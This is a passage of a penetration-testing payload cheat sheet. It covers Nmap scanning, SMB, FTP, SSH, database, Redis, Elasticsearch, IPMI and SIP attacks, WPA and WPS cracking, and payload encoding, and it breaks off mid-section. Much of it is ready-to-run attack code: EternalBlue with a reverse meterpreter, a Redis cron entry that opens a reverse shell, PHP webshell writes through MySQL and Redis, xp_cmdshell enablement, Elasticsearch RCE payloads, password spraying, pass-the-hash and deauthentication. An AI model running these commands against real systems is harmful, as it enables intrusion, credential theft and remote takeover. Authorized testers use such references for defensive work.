# Payload Reference Book — Part 3: Network Attacks, Encoding & File Transfer

> **Authorized Use Only.** This reference is intended for professional penetration testers operating under a signed statement of work with explicit written authorization. All techniques are publicly documented via CVE assignments, OWASP, SANS, MITRE ATT&CK, or standard security tooling documentation.

---

## SECTION 14: NETWORK ENUMERATION AND SERVICE ATTACKS

### 14.1 Nmap Scan Chains

#### Host Discovery (No Port Scan)

```bash
# ICMP echo + TCP SYN/ACK ping — no port scan, just live host list
nmap -sn 192.168.1.0/24

# ARP scan — LAN only, very fast, bypasses host-based firewalls
nmap -PR -sn 192.168.1.0/24

# Combine ARP + ICMP for local segments
nmap -PR -PE -sn 192.168.1.0/24

# Save live hosts for later use
nmap -sn 192.168.1.0/24 -oG - | awk '/Up$/{print $2}' > live_hosts.txt
```

#### Fast Top Ports

```bash
# Fast scan of top 100 ports (good for initial triage)
nmap -T4 -F 192.168.1.0/24

# Top 1000 ports (default nmap behavior)
nmap -T4 192.168.1.100

# Top 1000 ports with service version — balance of speed and info
nmap -T4 -sV 192.168.1.100
```

#### Full Port Scan

```bash
# All 65535 TCP ports — slow but comprehensive
nmap -p- -T4 192.168.1.100

# All ports with service detection, no DNS resolution (faster)
nmap -p- -T4 -sV -n 192.168.1.100

# All ports, skip host discovery (assume host is up)
nmap -p- -T4 -Pn 192.168.1.100
```

---

#### Standard Scan Progression (4 Phases)

**Phase 1 — Quick SYN Scan**

```bash
nmap -sS -T4 --top-ports 1000 -Pn -n -oA phase1_syn 192.168.1.100
```

When to use: First contact with any target. SYN scan is stealthy (does not complete TCP handshake), fast, and supported without nmap needing a full connection. Requires root/Administrator. Identifies open ports quickly so subsequent phases can be narrowed.

**Phase 2 — Service Version Detection**

```bash
nmap -sV -sC -p <open_ports_from_phase1> -Pn -n -oA phase2_versions 192.168.1.100
# Example with discovered ports:
nmap -sV -sC -p 22,80,443,445,3306 -Pn -n -oA phase2_versions 192.168.1.100
```

When to use: After Phase 1 open ports are known. `-sV` fingerprints service banners. `-sC` runs default NSE scripts which are safe and informative (http-title, ssh-hostkey, ssl-cert, etc.). Do not run `-sV --version-intensity 9` on production systems without change control — it can crash fragile services.

**Phase 3 — Targeted Script Scan**

```bash
# Run specific vuln/enum scripts against confirmed services
nmap --script smb-vuln-ms17-010,smb-vuln-ms08-067 -p 445 -Pn -oA phase3_smb_vuln 192.168.1.100
nmap --script http-shellshock,http-methods,http-auth-finder -p 80,443,8080 -oA phase3_web 192.168.1.100
nmap --script ftp-anon,ftp-bounce -p 21 -oA phase3_ftp 192.168.1.100
```

When to use: Targeted script scans after services are identified. Running all scripts (`-sC` or `--script=all`) is noisy and risks DoS — run only relevant categories or specific scripts.

**Phase 4 — Full UDP Top Ports**

```bash
# Top 100 UDP ports — slow, requires root, but finds SNMP/TFTP/NFS/DNS
nmap -sU --top-ports 100 -T4 -Pn -oA phase4_udp 192.168.1.100

# Common high-value UDP ports only
nmap -sU -p 53,69,111,123,161,162,500,514,520,1900 -Pn -oA phase4_udp_targeted 192.168.1.100
```

When to use: After TCP scan is complete. UDP scanning is slow (Linux rate-limiting ICMP port unreachables). Run in background. Key finds: SNMP (161), TFTP (69), NFS (111), DNS (53), IKE/VPN (500).

---

#### NSE Scripts by Category

**SMB Scripts**

```bash
# MS17-010 EternalBlue detection
nmap --script smb-vuln-ms17-010 -p 445 192.168.1.100

# MS08-067 Conficker/Netapi check
nmap --script smb-vuln-ms08-067 -p 445 192.168.1.100

# Enumerate shares (null + authenticated)
nmap --script smb-enum-shares -p 445 192.168.1.100
nmap --script smb-enum-shares --script-args smbuser=administrator,smbpass=Password1 -p 445 192.168.1.100

# Enumerate domain users via SAM
nmap --script smb-enum-users -p 445 192.168.1.100

# OS fingerprint via SMB
nmap --script smb-os-discovery -p 445 192.168.1.100

# Run all SMB scripts at once
nmap --script smb-* -p 139,445 192.168.1.100
```

**Web Scripts**

```bash
# Page title (useful for fingerprinting apps)
nmap --script http-title -p 80,443,8080,8443 192.168.1.100

# Allowed HTTP methods (PUT/DELETE = file upload risk)
nmap --script http-methods -p 80,443 192.168.1.100

# Authentication type detection (Basic, Digest, NTLM, etc.)
nmap --script http-auth-finder -p 80,443 192.168.1.100

# Shellshock detection (CVE-2014-6271)
nmap --script http-shellshock -p 80,443 192.168.1.100

# Run full safe web scripts
nmap --script "http-*" -p 80,443 192.168.1.100
```

**FTP Scripts**

```bash
# Detect anonymous FTP login
nmap --script ftp-anon -p 21 192.168.1.100

# FTP bounce scan (using FTP server as proxy for port scanning)
nmap --script ftp-bounce -p 21 192.168.1.100

# Combined
nmap --script ftp-anon,ftp-bounce,ftp-syst -p 21 192.168.1.100
```

**SSH Scripts**

```bash
# Detect supported authentication methods
nmap --script ssh-auth-methods --script-args="ssh.user=root" -p 22 192.168.1.100

# Grab host key (fingerprint for comparison)
nmap --script ssh-hostkey -p 22 192.168.1.100

# Check for weak algorithms
nmap --script ssh2-enum-algos -p 22 192.168.1.100
```

**SNMP Scripts**

```bash
# General SNMP info (system description, uptime, interfaces)
nmap --script snmp-info -p 161 -sU 192.168.1.100

# Brute force community strings
nmap --script snmp-brute -p 161 -sU 192.168.1.100

# SNMP interfaces, processes, software list
nmap --script snmp-interfaces,snmp-processes,snmp-win32-software -p 161 -sU 192.168.1.100
```

**SMTP Scripts**

```bash
# User enumeration via VRFY/EXPN/RCPT
nmap --script smtp-enum-users -p 25 192.168.1.100

# Open relay test
nmap --script smtp-open-relay -p 25 192.168.1.100

# Combined SMTP
nmap --script smtp-* -p 25,465,587 192.168.1.100
```

**RDP Scripts**

```bash
# Detect RDP encryption level and NLA requirement
nmap --script rdp-enum-encryption -p 3389 192.168.1.100

# Check for BlueKeep (CVE-2019-0708) — detection only
nmap --script rdp-vuln-ms12-020 -p 3389 192.168.1.100
```

**Database Scripts**

```bash
# MSSQL version, instance name, named pipes
nmap --script ms-sql-info,ms-sql-config,ms-sql-ntlm-info -p 1433 192.168.1.100

# MySQL version, databases
nmap --script mysql-info,mysql-databases,mysql-empty-password -p 3306 192.168.1.100

# PostgreSQL info
nmap --script pgsql-brute -p 5432 192.168.1.100
```

---

#### Output Formats and Parsing

```bash
# Normal output (human readable)
nmap -T4 -sV 192.168.1.100 -oN scan_normal.txt

# XML output (for import into tools like Metasploit, Faraday, etc.)
nmap -T4 -sV 192.168.1.100 -oX scan_results.xml

# Grepable output (one line per host, easy to parse)
nmap -T4 -sV 192.168.1.100 -oG scan_grepable.txt

# All formats simultaneously (creates .nmap, .xml, .gnmap)
nmap -T4 -sV 192.168.1.100 -oA scan_all

# Extract open ports from grepable output (one-liner)
grep "open" scan_grepable.txt | grep -oP '\d+/open' | cut -d'/' -f1 | sort -n | tr '\n' ','

# Extract all hosts with specific open port from grepable
grep "445/open" scan_grepable.txt | awk '{print $2}'

# Parse nmap XML with Python
python3 -c "
import xml.etree.ElementTree as ET
tree = ET.parse('scan_results.xml')
for host in tree.findall('.//host'):
    addr = host.find('address').get('addr')
    for port in host.findall('.//port'):
        if port.find('state').get('state') == 'open':
            print(f\"{addr}:{port.get('portid')}\")
"
```

---

### 14.2 SMB Attacks

#### Enumeration

```bash
# Full SMB enumeration with enum4linux-ng (successor to enum4linux)
enum4linux-ng -A 192.168.1.100

# enum4linux-ng with credentials
enum4linux-ng -A -u 'administrator' -p 'Password1' 192.168.1.100

# smbclient — list shares with null session
smbclient -L //192.168.1.100 -N

# smbclient — connect to specific share (null session)
smbclient //192.168.1.100/ADMIN$ -N
smbclient //192.168.1.100/C$ -N

# smbmap — list share permissions
smbmap -H 192.168.1.100

# smbmap — null session share permissions
smbmap -H 192.168.1.100 -u '' -p ''

# smbmap — recursive listing of readable shares
smbmap -H 192.168.1.100 -R

# smbmap — with credentials
smbmap -H 192.168.1.100 -u 'administrator' -p 'Password1'

# CrackMapExec — SMB sweep of subnet
crackmapexec smb 192.168.1.0/24

# CrackMapExec — null session enum
crackmapexec smb 192.168.1.100 -u '' -p '' --shares

# CrackMapExec — list users
crackmapexec smb 192.168.1.100 -u '' -p '' --users

# rpcclient — null bind
rpcclient -U "" -N 192.168.1.100

# rpcclient commands (run interactively after connecting)
# enumdomusers          — list all domain users
# enumdomgroups         — list domain groups
# querydispinfo         — full user info including full names and descriptions
# querydominfo          — domain policy info (lockout threshold, etc.)
# netshareenumall       — enumerate all shares
# getdompwinfo          — password policy
```

#### EternalBlue (MS17-010)

```bash
# Detection with nmap
nmap --script smb-vuln-ms17-010 -p 445 192.168.1.100

# Metasploit exploit
# Module: exploit/windows/smb/ms17_010_eternalblue
# msfconsole:
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set LHOST 192.168.1.50
set LPORT 4444
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run

# Affected targets: Windows 7, Windows Server 2008, Windows Server 2008 R2
# (unpatched pre-MS17-010, released March 2017)
# Note: Windows XP/2003 variants exist but are less reliable with this module
# Use exploit/windows/smb/ms17_010_psexec for XP/2003

# Manual Python PoC (detection/research only)
# python3 checker.py 192.168.1.100
```

#### SMB Brute Force

```bash
# CrackMapExec — credential stuffing from file
crackmapexec smb 192.168.1.100 -u users.txt -p passwords.txt --no-bruteforce

# CrackMapExec — true brute force (all combinations, careful of lockout)
crackmapexec smb 192.168.1.100 -u users.txt -p passwords.txt

# CrackMapExec — password spray (single password, all users — lockout-safe)
crackmapexec smb 192.168.1.100 -u users.txt -p 'Password1' --continue-on-success

# CrackMapExec — pass-the-hash
crackmapexec smb 192.168.1.100 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c'

# Hydra — SMB brute force (slower than CME)
hydra -L users.txt -P passwords.txt 192.168.1.100 smb
```

---

### 14.3 FTP

```bash
# Anonymous login test (manual)
ftp 192.168.1.100
# Username: anonymous
# Password: anonymous@test.com (or blank)

# Nmap anonymous FTP detection
nmap --script ftp-anon -p 21 192.168.1.100

# Hydra FTP brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.100

# Hydra with user list
hydra -L users.txt -P passwords.txt ftp://192.168.1.100 -t 4

# Medusa FTP brute force
medusa -h 192.168.1.100 -U users.txt -P passwords.txt -M ftp

# Banner grab
nc -nv 192.168.1.100 21

# Writable FTP root to webshell upload
# If FTP root overlaps with web root (common on misconfigured shared hosts):
ftp 192.168.1.100
put shell.php
# Then access via: http://192.168.1.100/shell.php

# Test if FTP root is web-accessible
curl -s http://192.168.1.100/shell.php

# Upload binary via FTP (ensure binary mode)
ftp 192.168.1.100
binary
put reverse_shell.exe
```

---

### 14.4 SSH

```bash
# Version banner enumeration
nc -nv 192.168.1.100 22
ssh -vvv user@192.168.1.100 2>&1 | head -30

# Auth method enumeration
nmap --script ssh-auth-methods --script-args="ssh.user=root" -p 22 192.168.1.100

# Brute force with Hydra (authorized testing only)
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100
hydra -L users.txt -P passwords.txt ssh://192.168.1.100 -t 4 -s 22

# Medusa SSH brute force
medusa -h 192.168.1.100 -U users.txt -P passwords.txt -M ssh

# Username enumeration — CVE-2018-15473 (OpenSSH < 7.7)
# Tool: ssh-username-enum or Metasploit auxiliary
use auxiliary/scanner/ssh/ssh_enumusers
set RHOSTS 192.168.1.100
set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
run

# Manual CVE-2018-15473 test (timing-based)
python3 ssh_user_enum.py --port 22 --userList users.txt 192.168.1.100

# Key-based lateral movement — use captured private key
ssh -i id_rsa user@192.168.1.101
chmod 600 id_rsa && ssh -i id_rsa user@192.168.1.101

# SSH local port forward (expose remote service locally)
# Access remote service at 127.0.0.1:8080 on attacker via target:80
ssh -L 8080:127.0.0.1:80 user@192.168.1.100

# SSH remote port forward (expose attacker service on target)
# Expose attacker port 4444 on target as 0.0.0.0:4445
ssh -R 4445:127.0.0.1:4444 user@192.168.1.100

# SSH SOCKS proxy (dynamic tunnel — pivot through target)
ssh -D 1080 -N user@192.168.1.100
# Then: proxychains nmap -sT -Pn 10.0.0.0/24

# SSH with ProxyJump (multi-hop)
ssh -J user@jumphost user@10.0.0.50

# SSH tunnel persistence (background, no shell)
ssh -fN -D 1080 user@192.168.1.100
```

---

### 14.5 SMTP

```bash
# Banner grab
nc -nv 192.168.1.100 25
openssl s_client -connect 192.168.1.100:465

# VRFY user enumeration (many modern servers disable this)
nc -nv 192.168.1.100 25
EHLO test.com
VRFY root
VRFY administrator
VRFY admin

# EXPN mailing list expansion
EXPN postmaster
EXPN support

# Open relay test sequence
nc -nv 192.168.1.100 25
EHLO attacker.com
MAIL FROM:<test@attacker.com>
RCPT TO:<victim@external.com>
DATA
Subject: relay test
Test body.
.
QUIT
# If 250 OK is returned for external RCPT TO, open relay confirmed

# smtp-user-enum tool
smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t 192.168.1.100
smtp-user-enum -M EXPN -U users.txt -t 192.168.1.100
smtp-user-enum -M RCPT -U users.txt -t 192.168.1.100 -D target.com

# Metasploit SMTP enum
use auxiliary/scanner/smtp/smtp_enum
set RHOSTS 192.168.1.100
set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
run
```

---

### 14.6 SNMP

```bash
# Default community string testing
snmpwalk -c public -v1 192.168.1.100
snmpwalk -c private -v1 192.168.1.100
snmpwalk -c community -v1 192.168.1.100
snmpwalk -c public -v2c 192.168.1.100

# SNMPwalk — system information
snmpwalk -c public -v2c 192.168.1.100 1.3.6.1.2.1.1

# SNMPwalk — running processes
snmpwalk -c public -v2c 192.168.1.100 1.3.6.1.2.1.25.4.2

# SNMPwalk — installed software (Windows)
snmpwalk -c public -v2c 192.168.1.100 1.3.6.1.2.1.25.6.3

# SNMPwalk — TCP connections and listening ports
snmpwalk -c public -v2c 192.168.1.100 1.3.6.1.2.1.6.13

# SNMPwalk — network interfaces
snmpwalk -c public -v2c 192.168.1.100 1.3.6.1.2.1.2.2

# SNMPwalk — ARP table (reveals other hosts on segment)
snmpwalk -c public -v2c 192.168.1.100 1.3.6.1.2.1.4.22

# Onesixtyone — bulk community string sweep
onesixtyone -c /usr/share/doc/onesixtyone/dict.txt 192.168.1.0/24
onesixtyone -c community_strings.txt -i live_hosts.txt

# snmp-check — human readable SNMP data dump
snmp-check -c public -v 2c 192.168.1.100

# Key OIDs
# 1.3.6.1.2.1.1.1.0      — sysDescr (OS, version, hardware)
# 1.3.6.1.2.1.1.5.0      — sysName (hostname)
# 1.3.6.1.2.1.25.4.2     — hrSWRunName (running processes)
# 1.3.6.1.2.1.25.6.3     — hrSWInstalledName (installed software, Windows)
# 1.3.6.1.2.1.6.13       — tcpConnTable (open TCP connections)
# 1.3.6.1.2.1.4.20       — ipAddrTable (IP addresses)
# 1.3.6.1.4.1.77.1.2.25  — Windows user accounts (MIB-II extension)
```

---

### 14.7 MSSQL

```bash
# Nmap MSSQL detection and enumeration
nmap --script ms-sql-info,ms-sql-config,ms-sql-ntlm-info -p 1433 192.168.1.100
nmap --script ms-sql-brute -p 1433 192.168.1.100

# Impacket mssqlclient — SQL auth
python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py sa:Password1@192.168.1.100

# Impacket mssqlclient — Windows auth (domain)
python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py DOMAIN/user:Password1@192.168.1.100 -windows-auth

# xp_cmdshell enablement sequence
-- Check if xp_cmdshell is enabled
SELECT name, value FROM sys.configurations WHERE name = 'xp_cmdshell';

-- Enable advanced options
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;

-- Enable xp_cmdshell
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Verify
SELECT name, value FROM sys.configurations WHERE name = 'xp_cmdshell';

# xp_cmdshell execution
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'net user';
EXEC xp_cmdshell 'powershell -enc [BASE64_PAYLOAD]';

# CrackMapExec MSSQL brute force
crackmapexec mssql 192.168.1.100 -u users.txt -p passwords.txt

# CrackMapExec MSSQL — execute command
crackmapexec mssql 192.168.1.100 -u sa -p Password1 -x 'whoami'

# Metasploit MSSQL login
use auxiliary/scanner/mssql/mssql_login
set RHOSTS 192.168.1.100
set USERNAME sa
set PASSWORD sa
run

# Metasploit MSSQL payload execution
use exploit/windows/mssql/mssql_payload
set RHOSTS 192.168.1.100
set USERNAME sa
set PASSWORD sa
run
```

---

### 14.8 MySQL / MariaDB

```bash
# Connect with common default credentials
mysql -h 192.168.1.100 -u root -p
mysql -h 192.168.1.100 -u root          # blank password
mysql -h 192.168.1.100 -u root -ptoor   # root:toor
mysql -h 192.168.1.100 -u root -proot   # root:root

# Nmap MySQL scripts
nmap --script mysql-info,mysql-databases,mysql-empty-password,mysql-enum -p 3306 192.168.1.100

# Hydra MySQL brute force
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://192.168.1.100

# Enumeration SQL commands (interactive)
SHOW DATABASES;
SHOW TABLES;
USE mysql;
SELECT user, password FROM mysql.user;             -- MySQL 5.x
SELECT user, authentication_string FROM mysql.user; -- MySQL 5.7+
SELECT version();
SELECT @@datadir;
SELECT @@basedir;
SELECT @@global.secure_file_priv;

# File read via LOAD_FILE (requires FILE privilege and secure_file_priv='')
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/var/www/html/config.php');
SELECT LOAD_FILE('C:\\\\Windows\\\\win.ini');

# File write via INTO OUTFILE (requires FILE privilege and writable path)
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
SELECT 'ssh-rsa AAAA...' INTO OUTFILE '/root/.ssh/authorized_keys';

# Check permissions before attempting file ops
SHOW GRANTS FOR CURRENT_USER();
SELECT user, host, File_priv FROM mysql.user;
```

---

### 14.9 Redis

```bash
# Redis CLI — unauthenticated connection
redis-cli -h 192.168.1.100

# Nmap Redis detection
nmap --script redis-info -p 6379 192.168.1.100

# INFO command — full server info (version, config, connected clients)
redis-cli -h 192.168.1.100 INFO

# CONFIG GET — dump configuration
redis-cli -h 192.168.1.100 CONFIG GET *
redis-cli -h 192.168.1.100 CONFIG GET dir
redis-cli -h 192.168.1.100 CONFIG GET dbfilename

# RCE via SSH authorized_keys write (Redis running as root or with write to /root/.ssh/)
redis-cli -h 192.168.1.100 CONFIG SET dir /root/.ssh/
redis-cli -h 192.168.1.100 CONFIG SET dbfilename authorized_keys
redis-cli -h 192.168.1.100 SET sshkey "\n\nssh-rsa AAAA...your-public-key...\n\n"
redis-cli -h 192.168.1.100 BGSAVE
# Then SSH in:
ssh -i id_rsa root@192.168.1.100

# RCE via cron write (Redis process has write access to /var/spool/cron/)
redis-cli -h 192.168.1.100 CONFIG SET dir /var/spool/cron/crontabs/
redis-cli -h 192.168.1.100 CONFIG SET dbfilename root
redis-cli -h 192.168.1.100 SET cron "\n\n* * * * * bash -i >& /dev/tcp/192.168.1.50/4444 0>&1\n\n"
redis-cli -h 192.168.1.100 BGSAVE
# Note: works on Debian/Ubuntu cron path. RHEL/CentOS uses /var/spool/cron/

# RCE via web shell write (web root must be writable)
redis-cli -h 192.168.1.100 CONFIG SET dir /var/www/html/
redis-cli -h 192.168.1.100 CONFIG SET dbfilename shell.php
redis-cli -h 192.168.1.100 SET webshell "<?php system(\$_GET['cmd']); ?>"
redis-cli -h 192.168.1.100 BGSAVE
curl http://192.168.1.100/shell.php?cmd=id
```

---

### 14.10 Elasticsearch

```bash
# Version and cluster info
curl -s http://192.168.1.100:9200/
curl -s http://192.168.1.100:9200/_cluster/health?pretty

# Node info (reveals OS, JVM, roles)
curl -s http://192.168.1.100:9200/_nodes?pretty

# Index listing
curl -s http://192.168.1.100:9200/_cat/indices?v

# Data dump — retrieve all documents from index
curl -s "http://192.168.1.100:9200/[index_name]/_search?size=100&pretty"
curl -s "http://192.168.1.100:9200/_all/_search?size=100&pretty"

# Search all indices for keyword
curl -s "http://192.168.1.100:9200/_all/_search?q=password&pretty"

# Get index mapping (schema)
curl -s http://192.168.1.100:9200/[index_name]/_mapping?pretty

# Script-based RCE — Elasticsearch < 1.6.0 (Groovy sandbox bypass, CVE-2014-3120, CVE-2015-1427)
curl -XPOST 'http://192.168.1.100:9200/_search?pretty' -d '
{
  "script_fields": {
    "cmd": {
      "script": "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"id\").getInputStream()).useDelimiter(\"\\\\A\").next();"
    }
  }
}'

# Dynamic script RCE — Elasticsearch 1.4.x (CVE-2014-3120)
curl -XPOST 'http://192.168.1.100:9200/_search' -d '
{"query":{"match_all":{}},"script_fields":{"inject":{"script":"java.lang.Math.class.forName(\"java.lang.Runtime\").getMethod(\"exec\",java.lang.String.class).invoke(java.lang.Math.class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null),\"id\")"}}}'
```

---

### 14.11 LDAP (Non-AD)

```bash
# Base enumeration — null bind (unauthenticated)
ldapsearch -x -H ldap://192.168.1.100 -b "dc=example,dc=com"

# Null bind explicit
ldapsearch -x -H ldap://192.168.1.100 -D "" -w "" -b "dc=example,dc=com"

# Discover naming context (base DN)
ldapsearch -x -H ldap://192.168.1.100 -s base namingContexts

# Enumerate users (null session)
ldapsearch -x -H ldap://192.168.1.100 -b "dc=example,dc=com" "(objectClass=person)"

# Enumerate groups
ldapsearch -x -H ldap://192.168.1.100 -b "dc=example,dc=com" "(objectClass=groupOfNames)"

# Credential-based enumeration
ldapsearch -x -H ldap://192.168.1.100 -D "cn=admin,dc=example,dc=com" -w 'Password1' -b "dc=example,dc=com"

# Get all attributes for all objects
ldapsearch -x -H ldap://192.168.1.100 -b "dc=example,dc=com" -D "cn=admin,dc=example,dc=com" -w 'Password1' "(objectClass=*)" "*" +

# LDAP over TLS
ldapsearch -Z -H ldap://192.168.1.100 -b "dc=example,dc=com" -x

# Nmap LDAP scripts
nmap --script ldap-search,ldap-rootdse -p 389 192.168.1.100
```

---

### 14.12 IPMI

```bash
# Nmap IPMI version detection
nmap --script ipmi-version -p 623 -sU 192.168.1.100

# IPMI Cipher 0 bypass — authenticate with any password
ipmitool -H 192.168.1.100 -U admin -P anypassword -C 0 chassis status

# List users via Cipher 0
ipmitool -H 192.168.1.100 -U admin -P anypassword -C 0 user list

# Metasploit IPMI hash dump (CVE-2013-4786 — RAKP authentication hash disclosure)
use auxiliary/scanner/ipmi/ipmi_dumphashes
set RHOSTS 192.168.1.100
set OUTPUT_HASHCAT_FILE ipmi_hashes.txt
run

# Crack dumped IPMI hashes with hashcat
hashcat -m 7300 ipmi_hashes.txt /usr/share/wordlists/rockyou.txt

# Metasploit IPMI Cipher 0 auth bypass
use auxiliary/scanner/ipmi/ipmi_cipher_zero
set RHOSTS 192.168.1.0/24
run

# Default IPMI credentials (vendor table):
# Dell iDRAC:    root / calvin
# HP iLO:        Administrator / (blank or 8-char on service tag sticker)
# Supermicro:    ADMIN / ADMIN
# Intel BMC:     admin / admin or admin / (blank)
# IBM IMM:       USERID / PASSW0RD
```

---

### 14.13 VoIP / SIP

```bash
# svmap — SIP device discovery scan
svmap 192.168.1.0/24

# svmap — specific port
svmap 192.168.1.0/24 -p 5060

# svwar — extension (user) enumeration
svwar -e100-500 192.168.1.100

# svwar — with custom user agent
svwar -e100-500 -m REGISTER 192.168.1.100

# svcrack — SIP credential brute force
svcrack -u100 -d /usr/share/wordlists/rockyou.txt 192.168.1.100

# Nmap SIP scripts
nmap --script sip-enum-users -p 5060 -sU 192.168.1.100
nmap --script sip-methods -p 5060 192.168.1.100

# Metasploit SIP enumeration
use auxiliary/scanner/sip/enumerator
set RHOSTS 192.168.1.100
set MINEXT 100
set MAXEXT 500
run

# SIPVicious full workflow
python3 svmap.py 192.168.1.0/24
python3 svwar.py -e100-500 192.168.1.100
python3 svcrack.py -u200 -d wordlist.txt 192.168.1.100
```

---

### 14.14 Network Device Defaults

```bash
# Common default credentials (routers/switches)
# Cisco IOS:     admin/cisco, cisco/cisco, (blank)/(blank)
# Cisco ASA:     admin/admin, pix/pix
# Juniper:       root/(blank)
# Netgear:       admin/password, admin/admin
# D-Link:        admin/admin, admin/(blank)
# TP-Link:       admin/admin
# Linksys:       admin/admin
# Ubiquiti:      ubnt/ubnt
# Zyxel:         admin/1234, admin/admin
# Fortinet:      admin/(blank), admin/admin

# Common management interface paths
# http://[target]/admin
# http://[target]/management
# http://[target]:8080/
# http://[target]:8443/
# http://[target]/cgi-bin/admin.cgi
# https://[target]:443/

# Telnet banner grab
nc -nv 192.168.1.1 23
telnet 192.168.1.1

# Nmap device default login scripts
nmap --script telnet-ntlm-info,telnet-brute -p 23 192.168.1.1

# HTTP Basic Auth brute on management interface
hydra -l admin -P /usr/share/wordlists/rockyou.txt http-get://192.168.1.1/admin

# SNMP community string = potential config extract
# Many Cisco devices expose full running config via SNMP write community
snmpwalk -c public -v1 192.168.1.1 1.3.6.1.4.1.9 | head -50
```

---

## SECTION 15: WIRELESS ATTACKS

### 15.1 WPA2 Handshake Capture

```bash
# Step 1 — Monitor mode setup
airmon-ng check kill          # kill interfering processes
airmon-ng start wlan0         # creates wlan0mon
iwconfig                      # verify interface in monitor mode

# Step 2 — airodump-ng scan (discover networks)
airodump-ng wlan0mon

# Step 3 — Targeted capture (specific BSSID and channel)
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture_file wlan0mon
# -c [channel], --bssid [AP MAC], -w [output prefix]

# Step 4 — Deauth to force client reconnect (in separate terminal)
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
# -0 = deauth, 5 = count, -a = AP MAC, -c = client MAC

# Broadcast deauth (all clients, louder but faster)
aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF wlan0mon

# Wait for "WPA handshake: AA:BB:CC:DD:EE:FF" in airodump-ng output

# Step 5 — Crack with aircrack-ng
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture_file-01.cap

# Step 6 — Convert to hashcat format with hcxtools
hcxpcapngtool -o hash.hc22000 capture_file-01.cap

# Step 7 — hashcat WPA2 crack (mode 22000 = WPA-PBKDF2-PMKID+EAPOL)
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

---

### 15.2 PMKID Attack (No Client Needed)

```bash
# hcxdumptool — capture PMKID from AP (no client required)
hcxdumptool -i wlan0mon -o pmkid_capture.pcapng --enable_status=3

# Target specific BSSID
hcxdumptool -i wlan0mon -o pmkid_capture.pcapng --filterlist_ap=target_bssids.txt --filtermode=2

# Convert capture to hashcat format
hcxpcapngtool -o pmkid.hc22000 pmkid_capture.pcapng

# hashcat PMKID crack (same mode 22000 covers both PMKID and EAPOL)
hashcat -m 22000 pmkid.hc22000 /usr/share/wordlists/rockyou.txt
hashcat -m 22000 pmkid.hc22000 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule

# Note: PMKID = HMAC-SHA1(PMK, "PMK Name" || BSSID || Client MAC)
# PMK = PBKDF2(passphrase, SSID, 4096, 32)
# The PMKID is available in the first EAPOL frame, before full handshake
```

---

### 15.3 WPS Attacks

```bash
# wash — scan for WPS-enabled networks
wash -i wlan0mon

# Targeted wash on specific channel
wash -i wlan0mon -c 6

# Pixie Dust attack (offline WPS PIN recovery — instant on vulnerable chips)
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K 1 -vv
# -K 1 = Pixie Dust attack mode
# Vulnerable vendors: Realtek, MediaTek, Ralink, some Broadcom

# WPS PIN brute force (reaver)
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv --delay=1 --lock-delay=300

# Bully (alternative WPS tool)
bully wlan0mon -b AA:BB:CC:DD:EE:FF -d -v 3

# Note: WPS lockout is common after ~5-10 failures. Pixie Dust is preferred
# when applicable as it is offline and does not trigger lockout.
```

---

### 15.4 WPA Enterprise (Brief)

```bash
# eaphammer — evil twin attack against WPA-Enterprise (EAP-PEAP/EAP-TTLS)
# Creates rogue AP, captures MSCHAPv2 challenge/response pairs
python3 eaphammer -i wlan0 --channel 6 --auth peap --wpa 2 --essid "CorpWifi" --creds

# Credential capture output location
cat loot/creds.txt

# After capturing MSCHAPv2:
# Crack with hashcat mode 5500 (NetNTLMv1) or asleap
asleap -C [challenge] -R [response] -W /usr/share/wordlists/rockyou.txt

# hashcat MSCHAPv2 (from PEAP capture)
hashcat -m 5500 captured_hash.txt /usr/share/wordlists/rockyou.txt
```

---

## SECTION 17: PAYLOAD ENCODING AND OBFUSCATION

### 17.1 Encoding Reference

#### Base64

```bash
# Linux encode
echo -n 'payload_string' | base64
echo -n 'cat /etc/passwd' | base64
# Output: Y2F0IC9ldGMvcGFzc3dk

# Linux decode
echo 'Y2F0IC9ldGMvcGFzc3dk' | base64 -d

# Linux encode file
base64 -w 0 /path/to/file.bin > file.b64

# Windows encode (PowerShell)
[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('payload'))
[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('payload'))

# Windows decode (PowerShell)
[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cABhAHkAbABvAGEAZAA='))

# Use case: bypassing input filters that block special characters, encoding
# binary payloads for text-only transports, encoding PS commands for -enc flag
```

#### URL Encoding

```bash
# Linux URL encode (curl utility)
python3 -c "import urllib.parse; print(urllib.parse.quote('payload string'))"
python3 -c "import urllib.parse; print(urllib.parse.quote_plus('cat /etc/passwd'))"

# Linux URL decode
python3 -c "import urllib.parse; print(urllib.parse.unquote('cat%20%2Fetc%2Fpasswd'))"

# Windows (PowerShell) URL encode
